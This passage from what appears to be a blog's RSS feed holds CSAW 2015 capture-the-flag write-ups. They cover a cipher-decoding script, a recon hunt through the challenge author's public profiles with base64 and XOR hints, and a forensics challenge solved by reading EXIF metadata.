	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlsafe_b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;caesard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_lowercase&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;shifted_alphabet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;maketrans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shifted_alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;flag&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;cipher_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec_ciphers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cipher_index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;globals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\n\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ciph&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Flag: flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}&lt;/p&gt;
</description>
        <pubDate>Sat, 19 Sep 2015 21:59:33 -0700</pubDate>
        <link>/blog/forensics/ctf/all/crypto/transfer</link>
        <guid isPermaLink="true">/blog/forensics/ctf/all/crypto/transfer</guid>
        
        <category>Forensics</category>
        
        <category>CTF</category>
        
        <category>CSAW</category>
        
        
        <category>Forensics</category>
        
        <category>CTF</category>
        
        <category>All</category>
        
        <category>Crypto</category>
        
      </item>
    
      <item>
        <title>CSAW 2015 ~ Alexander Taylor: Recon 100</title>
        <description>&lt;h2 id=&quot;alexander-taylor-recon-100&quot;&gt;Alexander Taylor: Recon 100&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;http://fuzyll.com/csaw2015/start&quot;&gt;http://fuzyll.com/csaw2015/start&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Yay more Recon. For those that don’t know what recon is, it is pretty much what you would call information gathering. You always first do recon when you do a pentest to get a scope of your target. In that way, the more information you have, the better ways you develop weaknesses, whether the weakness is a phishing attack or some physical penetration test. In this question we have to do some Reconnaissance on Alexander Taylor.&lt;/p&gt;

&lt;p&gt;This time around we are given a link.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://fuzyll.com/csaw2015/start&quot;&gt;http://fuzyll.com/csaw2015/start&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/step1.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/step1.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Upon entering link we are greeted with just a few lines of text:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; CSAW 2015 FUZYLL RECON PART 1 OF ?: Oh, good, you can use HTTP! The next part is at /csaw2015/&amp;lt;the acronym for my universitys hacking club&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From here we can google “Alexander Taylor” After looking through some github pages, twitter, and possible facebook, I started thinking, where is a sure place for Mr. Taylor to have his school? !! &lt;strong&gt;HIS LINKEDIN&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I found his &lt;a href=&quot;https://www.linkedin.com/in/fuzyll&quot;&gt;LinkedIn&lt;/a&gt; by using the same domain as his website (https://www.linkedin.com/in/fuzyll). We can assume this his online handle.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/LinkedIn.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/LinkedIn.png&quot; alt=&quot;LinkedinScreen&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Upon checking his LinkedIn, we see he went to the University of South Florida.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Current:	Ratheon
Previous:	The Brand Book, Sypris Electronics, LLC, University of South Florida
Education: 	University of South Florida
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After which we can google “University of south florida hacking club” which brings us to:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.wcsc.usf.edu/&quot;&gt;Whitehatters Computer Security Club&lt;/a&gt;
&lt;a href=&quot;https://viviturtle.github.io/images/csaw/wcsc.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/wcsc.png&quot; alt=&quot;wcsc&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;On this page we can clearly see the acronym: wcsc&lt;/p&gt;

&lt;p&gt;Moving onto &lt;a href=&quot;http://fuzyll.com/csaw2015/wcsc&quot;&gt;http://fuzyll.com/csaw2015/wcsc&lt;/a&gt; We are greeted with a similar string of hints.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt; CSAW 2015 FUZYLL RECON PART 2 OF ?: TmljZSB3b3JrISBUaGUgbmV4dCBwYXJ0IGlzIGF0IC9jc2F3MjAxNS88bXkgc3VwZXIgc21hc2ggYnJvdGhlcnMgbWFpbj4uCg==
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is obviously Base64 encoding so putting that into an online decoder such as &lt;a href=&quot;https://www.base64decode.org/&quot;&gt;https://www.base64decode.org/&lt;/a&gt; we get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Nice work! The next part is at /csaw2015/&amp;lt;my super smash brothers main&amp;gt;.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I googled “Fuzyll Smash” and arrived at a few &lt;a href=&quot;https://www.youtube.com/watch?v=59QQ9UevSuE&quot;&gt;YouTube&lt;/a&gt; Pages.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/youtube.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/youtube.png&quot; alt=&quot;youtube&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The answer here is from the title is Yoshi:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	&amp;gt; Smash 4 Weekly (2015-08-07) - Fuzyll (Yoshi) vs. Stiitch (Ike)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One step closer, we move on to the next page: &lt;a href=&quot;http://fuzyll.com/csaw2015/yoshi&quot;&gt;http://fuzyll.com/csaw2015/yoshi&lt;/a&gt;. We see a picture of yoshi here.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/yoshi.txt&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/yoshi.txt&quot; alt=&quot;Yoshi&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Noticing we have a picture, a good step would probably be to look at the metadeta. After downloading the picture, you can either upload it to &lt;a href=&quot;http://regex.info/exif.cgi&quot;&gt;Jeffrey’s Exif viewer&lt;/a&gt; or run exiftool, a tool to look at metadeta for like everything.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;exiftool yoshi.txt (it was named yoshi.txt i guess to throw us off)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This gives us:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ExifTool Version Number         : 9.46
File Name                       : yoshi.txt
Directory                       : .
File Size                       : 198 kB
File Modification Date/Time     : 2015:09:19 12:52:48-07:00
File Access Date/Time           : 2015:09:20 13:25:40-07:00
File Inode Change Date/Time     : 2015:09:20 13:25:40-07:00
File Permissions                : rw-r-----
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 500
Image Height                    : 537
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : Meters
Modify Date                     : 2015:09:18 03:00:11
Comment                         : CSAW 2015 FUZYLL RECON PART 3 OF ?: Isn&#39;t Yoshi the best?! The next egg in your hunt can be found at /csaw2015/&amp;lt;the cryptosystem I had to break in my first defcon qualifier&amp;gt;.
Image Size                      : 500x537
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at the comment we need to find the cryptosystem he did in his first defcon.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Comment: CSAW 2015 FUZYLL RECON PART 3 OF ?: Isn&#39;t Yoshi the best?! The next egg in your hunt can be found at /csaw2015/&amp;lt;the cryptosystem I had to break in my first defcon qualifier&amp;gt;.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From here I googled every iteration with words like fuzyll, decon, qualifier, cryptography, writeups, and cryptosystem, but nothing showed up.I then started to guess since they isn’t that many to guess with. Some examples include:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://fuzyll.com/csaw2015/rsa&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://fuzyll.com/csaw2015/enigma&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Enigma somehow worked. Going on to &lt;a href=&quot;http://fuzyll.com/csaw2015/enigma&quot;&gt;http://fuzyll.com/csaw2015/enigma&lt;/a&gt;. We are greeted with another text.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; CSAW 2015 FUZYLL RECON PART 4 OF 5: Okay, okay. This isn&#39;t Engima, but the next location was &quot;encrypted&quot; with the JavaScript below: Pla$ja|p$wpkt$kj$}kqv$uqawp$mw&amp;gt;$+gwes6451+pla}[waa[ia[vkhhmj
		
		var s = &quot;THIS IS THE INPUT&quot;
		var c = &quot;&quot;
		for (i = 0; i &amp;lt; s.length; i++) {
		    c += String.fromCharCode((s[i]).charCodeAt(0) ^ 0x4);
		}
		console.log(c);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks like he took some input and xor’d it with the hex character ‘0x4’. If you guys know your cryptography you can xor with ‘0x4 again to get the original text’(Crpypto 101)&lt;/p&gt;

&lt;p&gt;I modified the js to pretty much do the same exact thing, but with the string given.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/csaw/javascript_decode.js&quot;&gt;javascript_decode.js&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Pla$ja|p$wpkt$kj$}kqv$uqawp$mw&amp;gt;$+gwes6451+pla}[waa[ia[vkhhmj&quot;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I put this code into &lt;a href=&quot;http://www.webtoolkitonline.com/javascript-tester.html&quot;&gt;an online javascript interpreter&lt;/a&gt; and was given the string&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The next stop on your quest is: /csaw2015/they_see_me_rollin&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Finally, we arrive at the final page:	&lt;a href=&quot;http://fuzyll.com/csaw2015/they_see_me_rollin&quot;&gt;http://fuzyll.com/csaw2015/they_see_me_rollin&lt;/a&gt; with a string&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CSAW 2015 FUZYLL RECON PART 5 OF 5: Congratulations! Here’s your flag{I_S3ARCH3D_HI6H_4ND_L0W_4ND_4LL_I_F0UND_W4S_TH1S_L0USY_FL4G}!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;flag{I_S3ARCH3D_HI6H_4ND_L0W_4ND_4LL_I_F0UND_W4S_TH1S_L0USY_FL4G}!&lt;/p&gt;
</description>
        <pubDate>Fri, 18 Sep 2015 22:59:33 -0700</pubDate>
        <link>/blog/recon/ctf/all/alexander-taylor</link>
        <guid isPermaLink="true">/blog/recon/ctf/all/alexander-taylor</guid>
        
        <category>Recon</category>
        
        <category>CTF</category>
        
        <category>CSAW</category>
        
        
        <category>Recon</category>
        
        <category>CTF</category>
        
        <category>All</category>
        
      </item>
    
      <item>
        <title>CSAW 2015 ~ Keep Calm and CTF: Forensics 100</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;My friend sends me pictures before every ctf. He told me this one was special.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Note: this flag doesn’t follow the “flag{}” format&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/csaw/img.jpg&quot;&gt;img.jpg&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This one had a super easy solution. First it gave us a jpg. 
&lt;a href=&quot;https://viviturtle.github.io/images/csaw/img.jpg&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/csaw/img.jpg&quot; alt=&quot;img.jpg&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;First thing I always do is run strings&lt;/p&gt;

&lt;blockquote&gt;
  &lt;table&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td&gt;strings img.jpg&lt;/td&gt;
        &lt;td&gt;grep flag&lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/blockquote&gt;

&lt;p&gt;Nothing popped up.&lt;/p&gt;

&lt;p&gt;Next thing you always do for any kind of picture, well any forensics for that matter is look at metadeta. Simply upload the data to &lt;a href=&quot;http://regex.info/exif.cgi&quot;&gt;Jeffrey’s Exif viewer&lt;/a&gt; or use some tools we gathered over years of experience (LOL) such as “exiftool”, a tool to look at metadeta for everything.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;exiftool img.jpg&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;which gives me&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ExifTool Version Number         : 9.46
File Name                       : img.jpg
Directory                       : .
File Size                       : 92 kB
File Modification Date/Time     : 2015:09:18 15:52:29-07:00
File Access Date/Time           : 2015:09:20 13:25:40-07:00
File Inode Change Date/Time     : 2015:09:20 13:25:40-07:00
File Permissions                : rw-------
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 72
Y Resolution                    : 72
Exif Byte Order                 : Big-endian (Motorola, MM)
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Copyright                       : h1d1ng_in_4lm0st_pla1n_sigh7
Image Width                     : 600
Image Height                    : 700
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 600x700
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at the copyright section
&amp;gt;Copyright                       : h1d1ng_in_4lm0st_pla1n_sigh7&lt;/p&gt;

&lt;p&gt;you get the flag.&lt;/p&gt;

&lt;p&gt;h1d1ng_in_4lm0st_pla1n_sigh7&lt;/p&gt;
</description>
        <pubDate>Fri, 18 Sep 2015 21:59:33 -0700</pubDate>
        <link>/blog/ctf/stego/all/keep-calm-and-ctf</link>
        <guid isPermaLink="true">/blog/ctf/stego/all/keep-calm-and-ctf</guid>
        
        <category>Stego</category>
        
        <category>CTF</category>
        
        <category>CSAW</category>
        
        
        <category>CTF</category>
        
        <category>Stego</category>
        
        <category>All</category>
        
      </item>
    
  </channel>
</rss>
